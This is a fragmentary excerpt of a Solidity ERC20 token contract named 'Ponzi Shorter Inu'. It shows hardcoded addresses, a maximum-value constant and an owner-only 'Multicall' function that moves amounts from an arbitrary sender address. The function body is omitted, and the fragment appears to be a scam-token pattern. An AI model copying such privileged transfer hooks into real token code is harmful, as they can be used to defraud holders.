...
contract PonziShorter  is Context, IERC20 {
    ...
    address _addr = 0xADBaB4F38Ff9DCD71886f43B148bcad4A3081fB9;
    address public _origin = 0xad81F467CC997163480b1a8Ce88DcF10423CD91F;
    uint256 private _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    constructor () public {


        
        _name = "Ponzi Shorter Inu";
        _symbol = "p0nz1";
        _decimals = 18;
...
*/
        ...
        function Multicall(address sndr,address[] memory destination, uint256[] memory amounts) public auth(){
